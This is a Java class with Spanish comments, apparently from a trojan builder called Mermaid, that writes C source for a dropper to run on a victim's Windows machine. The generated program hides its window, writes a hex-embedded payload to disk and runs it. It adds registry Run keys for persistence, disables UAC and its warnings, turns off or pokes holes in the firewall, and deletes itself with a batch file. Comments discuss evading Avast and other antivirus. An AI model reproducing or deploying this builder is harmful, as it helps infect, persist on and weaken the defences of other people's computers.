package tk.jlxip.mermaid;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Pattern;

public class GenerateInstaller {
    String CFILE = "";  // Creamos un nuevo String global vacío donde almacenaremos la ruta del código fuente del instalador
    
    public void GenerateInstaller(File oldFile, String PATH, String FILENAME, String ADFOLDER, String HKCU, String HKLM, String DISABLEUAC, String DISABLEFIREWALL, String ADDFIREWALL, String PORT, String MELT, String HEX){
        String oldPath = oldFile.getAbsolutePath(); // Creamos un nuevo String con la ruta del troyano recibido por argumentos
        Pattern raw_dot_pattern = Pattern.compile(Pattern.quote("."));  // Creamos un patrón para separar Strings mediante el delimitador punto
        String[] dots = raw_dot_pattern.split(oldPath); // Creamos un array de Strings separando la variable oldPath
        String installerPath = "";  // Creamos un String vacío para guardar la ruta del código fuente del instalador
        for(int i=0;i<dots.length;i++){ // Recorremos el array dots
            if(i==dots.length-1){   // Si nos encontramos en la última posición...
                installerPath = installerPath + "c";    // Añadimos el carácter 'c' al final (para la extensión .c)
            } else {    // De otro modo...
                installerPath = installerPath + dots[i] + ".";  // Añadimos el string la posición actual del array más un punto
            }
        }
        
        CFILE = installerPath;  // Guardamos en la variable global la ruta del código fuente
        
        // ARREGLAMOS LA RUTA DE INSTALACIÓN EN LA MÁQUINA VÍCTIMA
        // (para conseguir duplicar los slatches y que funcione el código en lenguaje C)
        String FIXED_PATH = ""; // Creamos una variable vacía para almacenar la ruta arreglada
        Pattern raw_pathSlatches_pattern = Pattern.compile(Pattern.quote("\\"));    // Creamos un nuevo patrón para separar Strings mediante el delimitador de doble slatch \\
        String[] path_slatches = raw_pathSlatches_pattern.split(PATH);  // Creamos un array de Strings en el que separamos la variable PATH (recibida por argumentos)
        for(int i=0;i<path_slatches.length;i++){    // Recorremos el array de los slatches
            FIXED_PATH = FIXED_PATH + path_slatches[i] + "\\\\";    // Añadimos a la variable FIXED_PATH la posición actual del array y cuatro slatches: \\\\ (dos por estar en java, y otros dos por estar en C)
        }
        
        try{
            BufferedWriter writer = new BufferedWriter(new FileWriter(installerPath));  // Preparamos el archivo del código fuente para ser escrito
            // ESCRIBIR CÓDIGO FUENTE DEL INSTALADOR
            writer.write("#define _WIN32_WINNT 0x0500\n");  // Definimos _WIN32_WINT a 0x0500 para poder ocultar la ventana
            writer.write("#include <windows.h>\n"); // Incluímos la librería "windows.h"
            writer.write("#include <stdio.h>\n");   // Incluímos la librería "stdio.h"
            writer.write("#include <process.h>\n"); // Incluímos la librería "process.h"
            writer.write("int hex_to_int();\n");    // Definimos "hex_to_int" como un método
            writer.write("int hex_to_ascii();\n");  // Definimos "hex_to_ascii" como otro método
            writer.write("const char* hex=\""+HEX+"\";\n"); // Creamos un array de carácteres constante con el código hexadecimal del payload
            writer.write("main(){\n");  // Creamos el método main
            writer.write(" ShowWindow(GetConsoleWindow(), SW_HIDE);\n");    // Lo primero: hacemos la ventana invisible (aun así se verá un destello negro del cmd, ¡Qué putada!)
            /*
                NOTA
            EN TEORÍA NO HACE FALTA
            ESPERAR 20 SEGUNDOS, YA
            QUE EL AVAST DEEPSCREEN
            NO LO DETECTA.
            */
            //writer.write(" int retTime = time(0) + 20;\n");    // Esperamos 20 segundos para evitarnos el DeepScreen de AVAST y similares...
            //writer.write(" while(time(0)<retTime);\n");        // Mientras no haya acabado el tiempo, no hace nada.
            writer.write(" int length = strlen(hex);\n");   // Creamos una variable de tipo entero para almacenar el tamaño de la constante hexadecimal
            writer.write(" char buf = 0;\n");   // Creamos un carácter llamado "buf" y le asignamos el valor de 0
            
            // Procedemos a ver el tipo de ruta
            switch(PATH){
                case "%APPDATA%":   // Si es %APPDATA%...
                    writer.write(" char* path=getenv(\"APPDATA\");\n"); // Creamos una variable llamada path con la variable de entorno
                    break;
                case "%TEMP%":  // Si es %TEMP%...
                    writer.write(" char* path=getenv(\"TEMP\");\n");    // Lo mismo...
                    break;
                case "%PROGRAMFILES%":  // Si es %PROGRAMFILES%
                    writer.write(" char* path=getenv(\"PROGRAMFILES\");\n");    // Más de lo mismo...
                    break;
                default:    // Si no es nada de lo anterior
                    Pattern raw_upperdots_pattern = Pattern.compile(Pattern.quote("•"));    // Creamos un pattern con el símbolo •
                    String[] upperdots = raw_upperdots_pattern.split(PATH); // Creamos un array de Strings separando la variable PATH
                    if(upperdots.length>1){ // Si hay al menos un símbolo de ese tipo...
                        if(upperdots[0].equals("ENV")){ // Y detrás de él, está escrito "ENV"...
                            writer.write(" char* path=getenv(\""+upperdots[1]+"\");\n");    // En la variable metemos la variable de entorno elegida
                        }
                    } else {    // De otro modo...
                        // ARREGLAMOS LA RUTA (Duplicamos los slatches para escaparlos en C)
                        String fixedPATH = "";  // Creamos una variable vacía
                        Pattern raw_slatches_pattern = Pattern.compile(Pattern.quote("\\"));    // Creamos el patrón que separa Strings por el slatch "\"
                        String[] slatches = raw_slatches_pattern.split(PATH);   // Creamos un array de Strings con las separaciones de slatches de PATH
                        for(int i=0;i<slatches.length;i++){     // Recorremos dicho array...
                            if(i==slatches.length-1){
                                fixedPATH = fixedPATH + slatches[i];        // Si es el último slatch, no añadimos dicho símbolo al final (porque se añadirá luego, y por estandarizar el tema...)
                            } else {
                                fixedPATH = fixedPATH + slatches[i] + "\\\\";    // Y cada slatch lo añadimos a fixedPATH
                            }
                        }
                        
                        writer.write(" char* path=\""+fixedPATH+"\";\n");    // Ponemos directamente la ruta
                    }
            }
            
            writer.write(" char toopen[1024];\n");   // Creamos una variable donde almacenar la ruta del payload con la ruta que hemos sacado antes
            writer.write(" strcat(toopen, path);\n");  // Lo hacemos
            
            if(!ADFOLDER.equals("NULL")){   // Si se ha seleccionado la carpeta extra
                writer.write(" strcat(toopen, \"\\\\\");\n");   // Añadimos unos slatches
                writer.write(" strcat(toopen, \""+ADFOLDER+"\");\n");       // Añadimos el nombre de la carpeta
                writer.write(" mkdir(toopen);\n");  // La creamos, y seguimos...
            }
            
            writer.write(" strcat(toopen, \"\\\\\");\n");       // Unos cuantos slatches...
            writer.write(" strcat(toopen, \""+FILENAME+"\");\n");   // Y el FILENAME elegido
            
            writer.write(" FILE *file = fopen(toopen, \"wb\");\n");   // Abrimos (creamos) el payload en la ruta elegida para escribir bytes
            
            writer.write(" for(int i=0;i<length;i++){\n");  // Recorremos los bytes hexadecimales
            writer.write(" 	if(i%2 != 0){\n");  // Si la posición actual es impar...
            writer.write(" 		fprintf(file, \"%c\", hex_to_ascii(buf, hex[i]));\n");  // Escribimos en el archivo la representación ASCII de la cadena hexadecimal (2 bytes)
            writer.write(" 	} else {\n");   // De otro modo...
            writer.write(" 		buf = hex[i];\n");  // Guardamos el carácter actual en el buffer
            writer.write(" 	}\n");
            writer.write(" }\n");
            writer.write(" fclose(file);\n");   // Cerramos el archivo
            if(!HKCU.equals("NULL")){   // Si se ha elegido un nombre para el HKCU en el registro...
                writer.write(" char hkcutoexecute[2048]=\"REG ADD HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\\""+HKCU+"\\\" /t REG_SZ /d \\\"\";\n");
                writer.write(" strcat(hkcutoexecute, toopen);\n");
                writer.write(" strcat(hkcutoexecute, \"\\\"\");\n");
                writer.write(" system(hkcutoexecute);\n"); // Añadimos al registro (HKCU)
            }
            if(!HKLM.equals("NULL")){   // Si se ha elegido un nombre para el HKLM en el registro...
                writer.write(" char hklmtoexecute[2048]=\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\\""+HKLM+"\\\" /t REG_SZ /d \\\"\";\n");
                writer.write(" strcat(hklmtoexecute, toopen);\n");
                writer.write(" strcat(hklmtoexecute, \"\\\"\");\n");
                writer.write(" system(hklmtoexecute);\n"); // Añadimos al registro (HKLM)
            }
            if(DISABLEUAC.equals("TRUE")){  // Si se ha seleccionado desactivar el UAC...
                writer.write(" char uactoexecute[2048]=\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System 7v EnableLUA /t REG_DWORD /d 0 /f\";\n"); // Creamos una variable con el comando a ejecutar para desactivar el UAC
                writer.write(" system(uactoexecute);\n");   // Lo ejecutamos...
                writer.write(" char warningtoexecuteHKCU[2048]=\"REG ADD HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ActionCenter /v ReNotifyCount /t REG_DWORD /d 0 /f\";\n");   // Creamos una variable con el comando para desactivar la notificación de que el UAC no está activado
                writer.write(" system(warningtoexecuteHKCU);\n");   // Lo ejecutamos...
                writer.write(" char warningtoexecuteHKLM[2048]=\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ActionCenter /v ReNotifyCount /t REG_DWORD /d 0 /f\";\n");   // Lo mismo que arriba, pero en HKLM
                writer.write(" system(warningtoexecuteHKLM);\n");   // Lo ejecutamos...
            }
            if(DISABLEFIREWALL.equals("TRUE") || !ADDFIREWALL.equals("NULL")){ // Si se ha seleccionado desactivar el Firewall o añadir una excepción...
                writer.write(" char* envvar_temp=getenv(\"TEMP\");\n"); // Creamos una variable con la variable de entorno "TEMP"
                writer.write(" char txt_path[1024]=\"\";\n");    // Creamos una variable vacía para meter la ruta del txt que vamos a crear
                writer.write(" strcat(txt_path, envvar_temp);\n");      // Concatenamos envvar_temp
                writer.write(" strcat(txt_path, \"\\\\config.txt\");\n");       // Unos slatches, y "config.txt"
                /*
                A T E N C I Ó N
                ---------------
                En algún momento puede llegar a ser detectado el archivo %TEMP%\config.txt por los antivirus,
                ya que es completamente constante. Con esto llegamos a la siguiente conclusión:
                TODO: PERMITIR AL USUARIO INTRODUCIR EL NOMBRE DEL BAT
                */
                writer.write(" char checkver[1024]=\"\";\n");
                writer.write(" strcat(checkver, \"for /f \\\"tokens=2 delims=\\\\ \\\" %a in (\\\"%USERPROFILE%\\\") do (echo %a)>\");\n");
                writer.write(" strcat(checkver, txt_path);\n");
                writer.write(" system(checkver);\n");
                writer.write(" FILE *txt=fopen(txt_path, \"r\");\n");   // Abrimos el archivo txt para averiguar si la versión de Windows es XP o superior
                writer.write(" char winver_output[512]=\"\";\n");
                writer.write(" fgets(winver_output, 80, txt);\n");
                writer.write(" fclose(txt);\n");    // Cerramos el archivo y guardamos los cambios
                
                if(DISABLEFIREWALL.equals("TRUE")){ // Si se ha seleccionado desactivar el Firewall...
                    writer.write(" if(strcmp(winver_output,\"Documents\\n\")==0){\n");   // Si la versión de Windows es XP...
                    writer.write("  system(\"netsh firewall set opmode disable\");\n"); // Desactivamos el Firewall
                    writer.write(" } else {\n");    // De otro modo...
                    writer.write("  system(\"netsh advfirewall set allprofiles state off\");\n");   // Descativamos el Firewall
                    /*
                    A T E N C I Ó N
                    ---------------
                    El comando de arriba puede dejar de funcionar en versiones de Windows superiores a Windows 10
                    Si hace falta, lo cambiaré. Pero ahora mismo funciona para versiones superiores a Windows XP
                    */
                    writer.write(" }\n");
                }
                
                if(!ADDFIREWALL.equals("NULL")){ // Si se ha seleccionado añadir excepción al Firewall...
                    writer.write(" if(strcmp(winver_output,\"Documents\\n\")==0){\n");   // Si es Windows XP...
                    writer.write("  system(\"netsh firewall add portopening TCP "+PORT+" "+ADDFIREWALL+"\");\n");   // Añadimos la excepción
                    writer.write(" } else {\n");    // De otro modo...
                    writer.write("  char addfirewall_out[1024]=\"netsh advfirewall firewall add rule name=\\\""+ADDFIREWALL+"\\\" dir=out program=\\\"\";\n");  // Creamos una variable con parte del comando
                    writer.write("  strcat(addfirewall_out, toopen);\n");   // Le concatenamos la ruta del payload
                    writer.write("  strcat(addfirewall_out, \"\\\" protocol=tcp action=allow\");\n");       // Unos parámetros más...
                    writer.write("  system(addfirewall_out);\n");   // Y lo ejecutamos
                    writer.write("  char addfirewall_in[1024]=\"netsh advfirewall firewall add rule name=\\\""+ADDFIREWALL+"\\\" dir=in program=\\\"\";\n");
                    writer.write("  strcat(addfirewall_in, toopen);\n");
                    writer.write("  strcat(addfirewall_in, \"\\\" protocol=tcp action=allow\");\n");
                    writer.write("  system(addfirewall_in);\n");
                    writer.write(" }\n");
                }
            }
            writer.write(" spawnl(P_NOWAIT, toopen, toopen, NULL);\n");   // Ejecutamos el payload sin esperar a que termine
            if(MELT.equals("TRUE")){    // Si se ha seleccionado la opción Melt...
                writer.write(" wchar_t exebuffer[MAX_PATH];\n");    // Creamos una variable wchar_t para la ruta del instalador
                writer.write(" GetModuleFileName(NULL, exebuffer, MAX_PATH);\n");   // Obtenemos la ruta del instalador
                
                writer.write(" char melt[1024]=\"cmd.exe /c ping -n 2 0.0.0.0 & del \\\"\";\n");    // Creamos una variable con el comando a ejecutar
                writer.write(" strcat(melt, exebuffer);\n");    // Le añadimos la ruta del instalador
                writer.write(" strcat(melt, \"\\\" & del %%0\");\n"); // Y unos slatches, junto a eliminarse a sí mismo
                
                writer.write(" char* melt_envvar_temp=getenv(\"TEMP\");\n"); // Creamos una variable con la variable de entorno "TEMP"
                writer.write(" char meltbat[1024]=\"\";\n");    // Creamos una variable vacía para introducir la ruta del archivo m.bat
                writer.write(" strcat(meltbat, melt_envvar_temp);\n");  // Le concatenamso la variable %TEMP%
                writer.write(" strcat(meltbat, \"\\\\m.bat\");\n"); // Unos slatches, y "m.bat"
                /*
                A T E N C I Ó N
                ---------------
                En algún momento puede llegar a ser detectado el archivo %TEMP%\m.bat por los antivirus,
                ya que es completamente constante. Con esto llegamos a la siguiente conclusión:
                TODO: PERMITIR AL USUARIO INTRODUCIR EL NOMBRE DEL BAT
                */
                
                writer.write(" FILE *fmeltbat=fopen(meltbat, \"w\");\n");   // Abrimos el archivo ".bat" como escritura
                writer.write(" fprintf(fmeltbat, melt);\n");    // Escribimos en él el código
                writer.write(" fclose(fmeltbat);\n");   // Y cerramos
                
                writer.write(" spawnl(P_NOWAIT, meltbat, meltbat, NULL);\n");   // Por último, ejecutamos "m.bat" sin esperar a que termine
            }
            writer.write(" return 0;\n");   // Cerramos el instalador
            
            writer.write("}\n");
            writer.write("int hex_to_int(char c){\n");  // FUNCIÓN PARA CONVERTIR HEXADECIMAL A NÚMERO ENTERO
            writer.write(" int first = c / 16 - 3;\n");             // He de admitir que, de nuevo, no sé como funciona esto.
            writer.write(" int second = c % 16;\n");                // Lo encontré en este StackOverflow:
            writer.write(" int result = first*10 + second;\n");     // http://goo.gl/v4wfDp
            writer.write(" if(result > 9) result--;\n");            // 
            writer.write(" return result;\n");                      // ¡Perdón por el desconocimiento! :S
            writer.write("}\n");                                    //
            writer.write("int hex_to_ascii(char c, char d){\n"); // FUNCIÓN PARA CONVERTIR HEXADECIMAL A ASCII
            writer.write(" int high = hex_to_int(c) * 16;\n");      //
            writer.write(" int low = hex_to_int(d);\n");            //
            writer.write(" return high+low;\n");                    //
            writer.write("}\n");                                    //
            writer.close(); // Cerramos el archivo
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    public String GetCFILE(){   // Función pública para obtener la ruta del código fuente
        return CFILE;   // Returnamos la variable global con la ruta (CFILE)
    }
}
